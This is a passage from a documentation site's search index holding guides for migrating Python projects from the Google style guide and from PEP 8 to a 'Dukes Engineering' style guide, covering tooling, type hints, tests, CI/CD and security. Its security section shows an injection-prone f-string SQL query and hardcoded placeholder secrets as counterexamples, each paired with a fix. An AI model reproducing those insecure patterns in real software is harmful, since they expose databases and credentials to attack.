</ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-4-enhance-documentation","title":"Phase 4: Enhance Documentation","text":"<ul> <li>[ ] Add module metadata to docstrings</li> </ul> <pre><code>\"\"\"\n@module module_name\n@description Clear description\n@dependencies package1, package2\n@version 1.0.0\n@author Your Name\n@last_updated 2025-12-07\n@status stable\n\"\"\"\n</code></pre> <ul> <li>[ ] Verify Google-style docstrings</li> <li>Ensure all functions have <code>Args:</code>, <code>Returns:</code>, <code>Raises:</code> sections</li> <li> <p>Add usage examples for complex functions</p> </li> <li> <p>[ ] Document security classification</p> </li> <li> <p>Add <code>@security_classification</code> to sensitive modules</p> </li> <li> <p>[ ] Specify Python version requirements</p> </li> <li>Add <code>@python_version &gt;= 3.9</code> metadata</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-5-add-comprehensive-testing","title":"Phase 5: Add Comprehensive Testing","text":"<ul> <li>[ ] Create test directory structure</li> </ul> <pre><code>mkdir -p tests/\n# Mirror src/ structure in tests/\n</code></pre> <ul> <li>[ ] Migrate existing tests to new naming</li> <li>Pattern: <code>test_should_&lt;behavior&gt;_when_&lt;condition&gt;</code></li> <li> <p>Add clear docstrings to tests</p> </li> <li> <p>[ ] Write missing tests</p> </li> <li>Target 80%+ coverage for business logic</li> <li> <p>Focus on critical paths first</p> </li> <li> <p>[ ] Configure pytest</p> </li> </ul> <pre><code>[tool.pytest.ini_options]\nminversion = \"7.0\"\naddopts = \"-ra -q --cov=src --cov-report=term-missing --cov-fail-under=80\"\ntestpaths = [\"tests\"]\n</code></pre> <ul> <li>[ ] Run tests and verify coverage</li> </ul> <pre><code>pytest --cov=src --cov-report=html tests/\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-6-security-enhancements","title":"Phase 6: Security Enhancements","text":"<ul> <li>[ ] Move all secrets to environment variables</li> <li>Create <code>.env.example</code> template</li> <li>Add <code>.env</code> to <code>.gitignore</code></li> <li> <p>Use <code>python-dotenv</code> or <code>os.getenv()</code></p> </li> <li> <p>[ ] Add input validation</p> </li> <li>Use Pydantic for request/response models</li> <li> <p>Validate all external inputs</p> </li> <li> <p>[ ] Replace SQL string concatenation</p> </li> <li>Use parameterized queries</li> <li> <p>Use ORM query builders</p> </li> <li> <p>[ ] Run security scans</p> </li> </ul> <pre><code>bandit -r src/\nsafety check\n</code></pre> <ul> <li>[ ] Fix security vulnerabilities</li> <li>Address all high/critical Bandit findings</li> <li>Update vulnerable dependencies</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-7-error-handling","title":"Phase 7: Error Handling","text":"<ul> <li>[ ] Create custom exception hierarchies</li> </ul> <pre><code>class ServiceError(Exception):\n    \"\"\"Base exception for service errors.\"\"\"\n    pass\n\nclass ValidationError(ServiceError):\n    \"\"\"Input validation failed.\"\"\"\n    pass\n</code></pre> <ul> <li>[ ] Replace generic exception handling</li> <li>Use specific exceptions</li> <li> <p>Add structured logging</p> </li> <li> <p>[ ] Implement context managers</p> </li> <li>For database sessions</li> <li>For file operations</li> <li>For API connections</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-8-cicd-integration","title":"Phase 8: CI/CD Integration","text":"<ul> <li>[ ] Update CI/CD pipeline</li> </ul> <pre><code># Example GitHub Actions\n- name: Format check\n  run: black --check .\n\n- name: Import check\n  run: isort --check .\n\n- name: Lint\n  run: flake8 .\n\n- name: Type check\n  run: mypy src/\n\n- name: Test\n  run: pytest --cov=src tests/\n</code></pre> <ul> <li>[ ] Add branch protection rules</li> <li>Require all checks to pass</li> <li> <p>Require code review</p> </li> <li> <p>[ ] Add status badges</p> </li> <li>Test status</li> <li>Coverage percentage</li> <li>Code quality score</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#phase-9-documentation-and-training","title":"Phase 9: Documentation and Training","text":"<ul> <li>[ ] Update README</li> <li>Document new tooling requirements</li> <li> <p>Provide setup instructions</p> </li> <li> <p>[ ] Create CONTRIBUTING guide</p> </li> <li>Reference Dukes Engineering Style Guide</li> <li>Explain pre-commit hooks</li> <li> <p>Provide testing guidelines</p> </li> <li> <p>[ ] Team training</p> </li> <li>Share this migration guide</li> <li>Review key changes</li> <li>Set up developer environments</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#common-migration-pitfalls","title":"Common Migration Pitfalls","text":"","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#1-indentation-inconsistency-during-transition","title":"1. Indentation Inconsistency During Transition","text":"<p>Problem: Mixing 2-space and 4-space indentation during gradual migration.</p> <p>Solution: Run Black on the entire codebase at once. Create a dedicated \"Reformat with Black\" commit.</p> <pre><code>## Do this in one commit\nblack .\ngit add .\ngit commit -m \"refactor: convert to 4-space indentation with Black\"\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#2-type-hint-complexity-overload","title":"2. Type Hint Complexity Overload","text":"<p>Problem: Trying to add perfect type hints to complex legacy code immediately.</p> <p>Solution: Migrate incrementally. Start with new code and recently modified modules.</p> <pre><code>## Acceptable during migration\nresult = legacy_function()  # type: ignore\n\n## Target state after refactoring\nresult: Dict[str, List[User]] = legacy_function()\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#3-over-reliance-on-type-ignore","title":"3. Over-Reliance on <code># type: ignore</code>","text":"<p>Problem: Using <code># type: ignore</code> to bypass mypy without fixing root causes.</p> <p>Solution: Use specific ignores and track them. Create issues to fix them later.</p> <pre><code>## Avoid - too broad\nresult = complex_function()  # type: ignore\n\n## Better - specific and tracked\nresult = complex_function()  # type: ignore[arg-type]  # TODO: Fix in #123\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#4-breaking-cicd-during-formatter-migration","title":"4. Breaking CI/CD During Formatter Migration","text":"<p>Problem: CI/CD fails after switching from YAPF to Black.</p> <p>Solution: Update CI/CD configuration before reformatting code.</p> <pre><code>## Update this FIRST\n- name: Format check\n  run: black --check .  # Changed from yapf\n\n## THEN run black on codebase\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#5-test-naming-confusion","title":"5. Test Naming Confusion","text":"<p>Problem: Inconsistent test naming makes intent unclear.</p> <p>Solution: Follow pattern strictly: <code>test_should_&lt;behavior&gt;_when_&lt;condition&gt;</code></p> <pre><code>## Inconsistent\ndef test_user_creation():\n    pass\n\ndef test_email_validation():\n    pass\n\n## Consistent and clear\ndef test_should_create_user_when_valid_data_provided():\n    pass\n\ndef test_should_raise_error_when_invalid_email_provided():\n    pass\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#6-secrets-exposure-during-migration","title":"6. Secrets Exposure During Migration","text":"<p>Problem: Accidentally committing hardcoded secrets while refactoring.</p> <p>Solution: Add <code>.env</code> to <code>.gitignore</code> FIRST, then migrate secrets.</p> <pre><code>## Do this FIRST\necho \".env\" &gt;&gt; .gitignore\necho \".env.local\" &gt;&gt; .gitignore\ngit add .gitignore\ngit commit -m \"chore: ignore environment files\"\n\n## THEN migrate secrets\n## Create .env.example (safe to commit)\n## Move actual secrets to .env (never commit)\n</code></pre>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#gradual-adoption-strategy","title":"Gradual Adoption Strategy","text":"<p>If immediate full migration is not feasible, adopt incrementally:</p>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#weeks-1-2-tooling-foundation","title":"Weeks 1-2: Tooling Foundation","text":"<ul> <li>Install Black, mypy, pytest, pre-commit</li> <li>Configure <code>pyproject.toml</code> and <code>.flake8</code></li> <li>Run Black to reformat entire codebase (single commit)</li> <li>Set up pre-commit hooks</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#weeks-3-4-cicd-and-testing","title":"Weeks 3-4: CI/CD and Testing","text":"<ul> <li>Update CI/CD to use new tools</li> <li>Configure pytest with coverage reporting</li> <li>Write tests for new code (require 80% coverage for new modules)</li> <li>Add coverage tracking</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#weeks-5-6-type-hints-for-new-code","title":"Weeks 5-6: Type Hints for New Code","text":"<ul> <li>Require type hints for all new functions</li> <li>Add type hints to recently modified modules</li> <li>Start mypy checking on new modules only</li> <li>Gradually expand mypy coverage</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#weeks-7-8-documentation-enhancement","title":"Weeks 7-8: Documentation Enhancement","text":"<ul> <li>Add structured metadata to new module docstrings</li> <li>Enhance docstrings for public APIs</li> <li>Add usage examples to key functions</li> <li>Document security classifications</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#weeks-9-12-legacy-code-migration","title":"Weeks 9-12: Legacy Code Migration","text":"<ul> <li>Systematically add type hints to legacy modules</li> <li>Write tests for critical legacy code</li> <li>Achieve 80%+ coverage across codebase</li> <li>Enable strict mypy checking project-wide</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#month-4-complete-transition","title":"Month 4+: Complete Transition","text":"<ul> <li>All code follows Dukes Engineering standards</li> <li>100% type hint coverage</li> <li>80%+ test coverage</li> <li>Zero mypy errors</li> <li>All security scans passing</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#success-metrics","title":"Success Metrics","text":"<p>Track these metrics to measure migration progress:</p> Metric Target Measurement Type Hint Coverage 100% % functions with type hints mypy Pass Rate 100% % modules passing strict mypy Test Coverage 80%+ % code covered by tests Security Scan 0 high/critical Bandit/Safety findings Pre-commit Pass 100% % commits passing all hooks Docstring Completeness 100% % functions with structured docs Formatting Compliance 100% % files passing Black check","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#side-by-side-comparison-google-vs-dukes-engineering","title":"Side-by-Side Comparison: Google vs. Dukes Engineering","text":"Aspect Google Python Style Guide Dukes Engineering Style Guide Base Standard PEP 8 PEP 8 Indentation 2 spaces 4 spaces (PEP 8 standard) Line Length 80 characters 88 characters (Black default) Type Hints Recommended Required Docstrings Google style Google style + metadata Formatter YAPF Black Type Checker Pytype (optional) mypy (required) Linter Pylint Flake8 Import Sorter Manual/YAPF isort Test Coverage Encouraged Required 80%+ Test Framework Flexible pytest with coverage Test Naming Flexible Structured pattern Security Best practices Explicit requirements Secret Management Flexible Environment variables Input Validation Manual Pydantic schemas Pre-commit Hooks Optional Required CI/CD Integration Recommended Required","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#support-and-resources","title":"Support and Resources","text":"","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#documentation-references","title":"Documentation References","text":"<ul> <li>Python Style Guide - Full Dukes Engineering Python standards</li> <li>Testing Strategies - pytest patterns</li> <li>Security Scanning Guide - Bandit, Safety</li> <li>GitHub Actions Guide - Python CI/CD</li> <li>IDE Integration Guide - VS Code, PyCharm</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#tool-documentation","title":"Tool Documentation","text":"<ul> <li>Black - Code formatter</li> <li>mypy - Static type checker</li> <li>pytest - Testing framework</li> <li>isort - Import sorter</li> <li>Flake8 - Linter</li> <li>Bandit - Security scanner</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#external-references","title":"External References","text":"<ul> <li>Google Python Style Guide - Original Google guide</li> <li>PEP 8 - Python style guide</li> <li>PEP 484 - Type hints</li> </ul>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_google/#conclusion","title":"Conclusion","text":"<p>Migrating from Google Python Style Guide to Dukes Engineering Style Guide brings:</p> <p>\u2705 PEP 8 Alignment - 4-space indentation matches Python ecosystem standard \u2705 Modern Tooling - Black, mypy, pytest provide superior developer experience \u2705 Type Safety - Required type hints prevent runtime errors \u2705 Quality Assurance - 80%+ test coverage ensures reliability \u2705 Security First - Explicit security requirements protect infrastructure \u2705 Automation - Pre-commit hooks and CI/CD integration catch issues early \u2705 DevOps Ready - Enhanced metadata and documentation support automation</p> <p>While Google's guide is excellent for general Python development, Dukes Engineering guide adds the DevOps-focused enhancements essential for infrastructure automation, cloud deployments, and production reliability.</p> <p>Questions or need help? Open an issue or consult the Getting Started Guide.</p>","tags":["migration","google-style-guide","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/","title":"Migrating from PEP 8 to Dukes Engineering Style Guide","text":"","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#overview","title":"Overview","text":"<p>This guide helps Python developers transition from PEP 8 (the standard Python style guide) to the Dukes Engineering Style Guide. Our guide builds on PEP 8's foundation while adding modern DevOps-oriented enhancements for infrastructure automation, type safety, and security.</p>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#what-this-guide-covers","title":"What This Guide Covers","text":"<ul> <li>Compatibility assessment: What stays the same vs. what changes</li> <li>Enhanced requirements beyond PEP 8</li> <li>Tool configuration updates</li> <li>Step-by-step migration checklist</li> <li>Common migration pitfalls and solutions</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#who-should-use-this-guide","title":"Who Should Use This Guide","text":"<ul> <li>Teams currently following PEP 8 who want enhanced DevOps standards</li> <li>Projects transitioning to infrastructure-as-code automation</li> <li>Python developers adding type hints and security best practices</li> <li>Organizations standardizing on modern Python tooling (Black, mypy)</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#quick-compatibility-summary","title":"Quick Compatibility Summary","text":"<pre><code>graph LR\n    PEP8[PEP 8 Standards] --&gt; Same[100% Compatible&lt;br/&gt;Base Conventions]\n    PEP8 --&gt; Enhanced[Enhanced Requirements&lt;br/&gt;Type Hints, Docs, Security]\n    PEP8 --&gt; Relaxed[Relaxed Constraints&lt;br/&gt;Line Length 88 chars]\n\n    Same --&gt; Migration[Migration Path]\n    Enhanced --&gt; Migration\n    Relaxed --&gt; Migration\n\n    Migration --&gt; DukesGuide[Dukes Engineering&lt;br/&gt;Style Guide]\n\n    style Same fill:#e8f5e9\n    style Enhanced fill:#fff3e0\n    style Relaxed fill:#e3f2fd\n    style DukesGuide fill:#f3e5f5</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#what-stays-the-same","title":"What Stays the Same","text":"<p>The Dukes Engineering Style Guide maintains full compatibility with PEP 8 core conventions. If your code follows PEP 8, these aspects require no changes:</p>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#naming-conventions","title":"Naming Conventions \u2705","text":"Element Convention PEP 8 Our Guide Variables <code>snake_case</code> \u2705 \u2705 Same Functions <code>snake_case</code> \u2705 \u2705 Same Constants <code>UPPER_SNAKE_CASE</code> \u2705 \u2705 Same Classes <code>PascalCase</code> \u2705 \u2705 Same Modules <code>snake_case</code> \u2705 \u2705 Same Private <code>_leading_underscore</code> \u2705 \u2705 Same","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#code-structure","title":"Code Structure \u2705","text":"<ul> <li>Indentation: 4 spaces (never tabs)</li> <li>Blank lines: 2 between top-level definitions, 1 between methods</li> <li>Import order: Standard library \u2192 third-party \u2192 local</li> <li>Whitespace: Consistent spacing around operators</li> <li>Comments: <code>#</code> for inline, <code>\"\"\"</code> for docstrings</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#formatting","title":"Formatting \u2705","text":"<ul> <li>String quotes (prefer double, use single to avoid escapes)</li> <li>Parentheses for line continuation</li> <li>Trailing commas in multi-line structures</li> <li>No trailing whitespace</li> </ul> <p>Example - No Changes Needed:</p> <pre><code>## This PEP 8 code is already compliant\nimport os\nimport sys\n\nimport requests\n\nfrom myapp.utils import helper\n\nMAX_RETRIES = 3\n\nclass UserService:\n    \"\"\"Service for user management.\"\"\"\n\n    def get_user(self, user_id: int):\n        \"\"\"Retrieve user by ID.\"\"\"\n        return database.query(user_id)\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#what-changes-enhancements-beyond-pep-8","title":"What Changes: Enhancements Beyond PEP 8","text":"","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#1-line-length-79-88-characters","title":"1. Line Length: 79 \u2192 88 Characters","text":"<p>PEP 8: Maximum 79 characters Our Guide: Maximum 88 characters (Black default)</p> <p>Why: Modern displays support wider lines, and Black's 88-character limit reduces unnecessary line breaks while maintaining readability.</p> <p>Migration:</p> <pre><code>## PEP 8 (79 chars) - line breaks needed\nuser_data = database.query(User).filter(\n    User.is_active == True\n).all()\n\n## Our Guide (88 chars) - more natural flow\nuser_data = database.query(User).filter(User.is_active == True).all()\n</code></pre> <p>Action Required:</p> <ul> <li>Update editor rulers to 88 characters</li> <li>Configure Black formatter with default settings</li> <li>Run <code>black .</code> to automatically reformat</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#2-type-hints-optional-required","title":"2. Type Hints: Optional \u2192 Required","text":"<p>PEP 8: Type hints are optional (PEP 484 compliance) Our Guide: Type hints required for all function signatures</p> <p>Why: Type hints enable static analysis, improve IDE support, prevent runtime errors, and serve as inline documentation for DevOps automation code.</p> <p>Migration:</p> <pre><code>## PEP 8 - acceptable without type hints\ndef get_user(user_id):\n    \"\"\"Retrieve user by ID.\"\"\"\n    return database.query(User).filter(User.id == user_id).first()\n\n## Our Guide - type hints required\nfrom typing import Optional\n\ndef get_user(user_id: int) -&gt; Optional[User]:\n    \"\"\"Retrieve user by ID.\"\"\"\n    return database.query(User).filter(User.id == user_id).first()\n</code></pre> <p>Action Required:</p> <ul> <li>Add type hints to all function signatures</li> <li>Import typing module: <code>from typing import List, Dict, Optional, Union</code></li> <li>Run <code>mypy</code> to validate type correctness</li> <li>Update docstrings to remove redundant type info (now in hints)</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#3-documentation-basic-enhanced-metadata","title":"3. Documentation: Basic \u2192 Enhanced Metadata","text":"<p>PEP 8: Docstrings required for public modules, classes, functions Our Guide: Enhanced module docstrings with structured metadata</p> <p>Why: Structured metadata enables automated documentation generation, dependency tracking, and AI-assisted code understanding.</p> <p>Migration:</p> <pre><code>## PEP 8 - basic module docstring\n\"\"\"User authentication module.\"\"\"\n\nimport jwt\nfrom fastapi import HTTPException\n\n## Our Guide - enhanced metadata\n\"\"\"\n@module user_authentication\n@description Handles user authentication, session management, and JWT token generation\n@dependencies fastapi, pyjwt, passlib, python-dotenv\n@version 1.2.0\n@author Tyler Dukes\n@last_updated 2025-12-07\n@status stable\n@security_classification internal\n@python_version &gt;= 3.9\n\"\"\"\n\nimport jwt\nfrom fastapi import HTTPException\n</code></pre> <p>Action Required:</p> <ul> <li>Add metadata tags to module docstrings</li> <li>Document dependencies explicitly</li> <li>Add version and status information</li> <li>Specify minimum Python version requirements</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#4-docstrings-pep-257-googlenumpy-style-with-examples","title":"4. Docstrings: PEP 257 \u2192 Google/NumPy Style with Examples","text":"<p>PEP 8/257: Basic docstring format Our Guide: Structured docstrings with Args, Returns, Raises, Examples</p> <p>Why: Consistent structured docstrings improve API documentation, enable automated doc generation, and provide usage examples.</p> <p>Migration:</p> <pre><code>## PEP 8/257 - basic docstring\ndef authenticate_user(username, password):\n    \"\"\"Authenticate user and return user object or None.\"\"\"\n    pass\n\n## Our Guide - structured with examples\ndef authenticate_user(username: str, password: str) -&gt; Optional[User]:\n    \"\"\"\n    Authenticate user credentials and return user object if valid.\n\n    Args:\n        username: User's username or email address\n        password: Plain text password to verify\n\n    Returns:\n        User object if authentication succeeds, None otherwise\n\n    Raises:\n        DatabaseError: If database connection fails\n        ValidationError: If username format is invalid\n\n    Example:\n        &gt;&gt;&gt; user = authenticate_user(\"john@example.com\", \"secret123\")\n        &gt;&gt;&gt; if user:\n        ...     print(f\"Welcome {user.name}\")\n    \"\"\"\n    pass\n</code></pre> <p>Action Required:</p> <ul> <li>Restructure docstrings with Args/Returns/Raises sections</li> <li>Add usage examples to complex functions</li> <li>Document all exceptions that may be raised</li> <li>Use consistent formatting (Google or NumPy style)</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#5-testing-recommended-required-coverage","title":"5. Testing: Recommended \u2192 Required Coverage","text":"<p>PEP 8: No specific testing requirements Our Guide: 80%+ unit test coverage required, structured test naming</p> <p>Why: High test coverage ensures reliability for infrastructure automation where failures have production impact.</p> <p>Migration:</p> <pre><code>## No PEP 8 equivalent - testing not mandated\n\n## Our Guide - required test structure\nimport pytest\nfrom app.services.user_service import UserService\n\ndef test_should_return_user_when_valid_id_provided():\n    \"\"\"Test get_user_by_id returns user for valid ID.\"\"\"\n    # Arrange\n    user_id = 123\n\n    # Act\n    user = get_user_by_id(user_id)\n\n    # Assert\n    assert user.id == user_id\n    assert user is not None\n\ndef test_should_raise_error_when_user_not_found():\n    \"\"\"Test get_user_by_id raises NotFoundError for invalid ID.\"\"\"\n    with pytest.raises(NotFoundError):\n        get_user_by_id(999999)\n</code></pre> <p>Action Required:</p> <ul> <li>Create <code>tests/</code> directory mirroring <code>src/</code> structure</li> <li>Write tests for all business logic (target 80%+ coverage)</li> <li>Use naming convention: <code>test_should_&lt;behavior&gt;_when_&lt;condition&gt;</code></li> <li>Set up pytest with coverage reporting</li> <li>Add pytest configuration to <code>pyproject.toml</code></li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#6-security-implicit-explicit-best-practices","title":"6. Security: Implicit \u2192 Explicit Best Practices","text":"<p>PEP 8: No security-specific requirements Our Guide: Mandatory security practices for DevOps code</p> <p>Why: Infrastructure automation code handles sensitive data, credentials, and production systems. Security must be explicit.</p> <p>Migration - Input Validation:</p> <pre><code>## PEP 8 - basic validation\ndef get_user_by_email(email):\n    query = f\"SELECT * FROM users WHERE email = '{email}'\"\n    return db.execute(query)\n\n## Our Guide - security-first with validation\nfrom pydantic import BaseModel, EmailStr, validator\n\nclass UserQuery(BaseModel):\n    \"\"\"Validated user query request.\"\"\"\n    email: EmailStr\n\ndef get_user_by_email(email: str) -&gt; Optional[User]:\n    \"\"\"Get user by email using parameterized query.\"\"\"\n    # Input validation with Pydantic\n    user_query = UserQuery(email=email)\n\n    # Parameterized query prevents SQL injection\n    query = text(\"SELECT * FROM users WHERE email = :email\")\n    result = db.execute(query, {\"email\": user_query.email})\n    return result.first()\n</code></pre> <p>Migration - Secret Management:</p> <pre><code>## PEP 8 - no specific requirements\nDATABASE_URL = \"postgresql://user:pass@localhost/db\"\nAPI_KEY = \"sk_live_abc123\"\n\n## Our Guide - environment-based secrets\nimport os\nfrom functools import lru_cache\n\n@lru_cache()\ndef get_settings():\n    \"\"\"Get application settings from environment.\"\"\"\n    return {\n        \"database_url\": os.getenv(\"DATABASE_URL\"),\n        \"api_key\": os.getenv(\"API_KEY\"),\n        \"secret_key\": os.getenv(\"SECRET_KEY\")\n    }\n</code></pre> <p>Action Required:</p> <ul> <li>Add input validation with Pydantic or custom validators</li> <li>Replace string concatenation with parameterized queries</li> <li>Move all secrets to environment variables</li> <li>Add <code>.env</code> to <code>.gitignore</code></li> <li>Use validation libraries (Pydantic, Cerberus)</li> <li>Run security scanners (Bandit, Safety)</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#7-error-handling-general-specific-exceptions","title":"7. Error Handling: General \u2192 Specific Exceptions","text":"<p>PEP 8: No specific error handling patterns Our Guide: Fail-fast with specific custom exceptions</p> <p>Migration:</p> <pre><code>## PEP 8 - generic exception handling\ndef fetch_data(url):\n    try:\n        response = requests.get(url)\n        return response.json()\n    except Exception as e:\n        print(f\"Error: {e}\")\n        return None\n\n## Our Guide - specific exceptions and proper cleanup\nclass APIError(Exception):\n    \"\"\"Base exception for API-related errors.\"\"\"\n    pass\n\nclass APITimeoutError(APIError):\n    \"\"\"Raised when API request times out.\"\"\"\n    pass\n\ndef fetch_data(url: str) -&gt; Dict:\n    \"\"\"Fetch data from remote API with retry logic.\"\"\"\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        return response.json()\n    except requests.Timeout:\n        logger.error(f\"Timeout fetching data from {url}\")\n        raise APITimeoutError(f\"Request to {url} timed out\")\n    except requests.HTTPError as e:\n        logger.error(f\"HTTP error {e.response.status_code}: {url}\")\n        raise APIError(f\"Failed to fetch data: {e}\")\n    except ValueError:\n        logger.error(f\"Invalid JSON response from {url}\")\n        raise DataFormatError(\"Response is not valid JSON\")\n</code></pre> <p>Action Required:</p> <ul> <li>Create custom exception hierarchies for your domain</li> <li>Replace generic <code>except Exception</code> with specific exceptions</li> <li>Add proper logging before raising exceptions</li> <li>Use context managers for resource cleanup</li> <li>Never silently catch exceptions (<code>except: pass</code>)</li> </ul>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#tool-configuration-changes","title":"Tool Configuration Changes","text":"","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#black-formatter-new-requirement","title":"Black Formatter (New Requirement)","text":"<p>Black is required for consistent code formatting. PEP 8 doesn't mandate a specific formatter.</p> <p>Installation:</p> <pre><code>pip install black\n</code></pre> <p>Configuration (<code>pyproject.toml</code>):</p> <pre><code>[tool.black]\nline-length = 88\ntarget-version = ['py39', 'py310', 'py311']\ninclude = '\\.pyi?$'\n</code></pre> <p>Usage:</p> <pre><code>## Format entire project\nblack .\n\n## Check without modifying\nblack --check .\n\n## Format specific file\nblack src/mymodule.py\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#mypy-type-checker-new-requirement","title":"mypy Type Checker (New Requirement)","text":"<p>Static type checking is required. Configure mypy for your project.</p> <p>Installation:</p> <pre><code>pip install mypy\n</code></pre> <p>Configuration (<code>mypy.ini</code> or <code>pyproject.toml</code>):</p> <pre><code>[tool.mypy]\npython_version = \"3.9\"\nwarn_return_any = true\nwarn_unused_configs = true\ndisallow_untyped_defs = true\ndisallow_any_unimported = true\nno_implicit_optional = true\nwarn_redundant_casts = true\nwarn_unused_ignores = true\nwarn_no_return = true\ncheck_untyped_defs = true\nstrict_equality = true\n</code></pre> <p>Usage:</p> <pre><code>## Type check entire project\nmypy src/\n\n## Type check specific module\nmypy src/mymodule.py\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#isort-import-organizer-enhanced","title":"isort Import Organizer (Enhanced)","text":"<p>Configure isort to work with Black.</p> <p>Configuration (<code>pyproject.toml</code>):</p> <pre><code>[tool.isort]\nprofile = \"black\"\nline_length = 88\nmulti_line_output = 3\ninclude_trailing_comma = true\nforce_grid_wrap = 0\nuse_parentheses = true\nensure_newline_before_comments = true\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#pytest-with-coverage-new-requirement","title":"pytest with Coverage (New Requirement)","text":"<p>Installation:</p> <pre><code>pip install pytest pytest-cov pytest-mock\n</code></pre> <p>Configuration (<code>pyproject.toml</code>):</p> <pre><code>[tool.pytest.ini_options]\nminversion = \"7.0\"\naddopts = \"-ra -q --strict-markers --cov=src --cov-report=term-missing --cov-fail-under=80\"\ntestpaths = [\"tests\"]\npython_files = [\"test_*.py\", \"*_test.py\"]\npython_classes = [\"Test*\"]\npython_functions = [\"test_*\"]\n</code></pre> <p>Usage:</p> <pre><code>## Run tests with coverage\npytest --cov=src tests/\n\n## Generate HTML coverage report\npytest --cov=src --cov-report=html tests/\n</code></pre>","tags":["migration","pep8","python","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_pep8/#pre-commit-hooks-new-requirement","title":"Pre-commit Hooks (New Requirement)","text":"<p>Automate code quality checks before commits.</p> <p>Installation:</p> <pre><code>pip install pre-commit\n</code></pre> <p>Configuration (<code>.pre-commit-config.yaml</code>):</p> <pre><code>repos:\n  - repo: https://github.com/psf/black\n    rev: 24.10.0\n    hooks:\n      - id: black\n        language_version: python3.11\n\n  - repo: https://github.com/pycqa/isort\n    rev: 5.13.2\n    hooks:\n      - id: isort\n        args: [\"--profile\", \"black\"]\n\n  - repo: https://github.com/pycqa/flake8\n    rev: 7.1.1\n    hooks:\n      - id: flake8\n        args: [\"--max-line-length=88\", 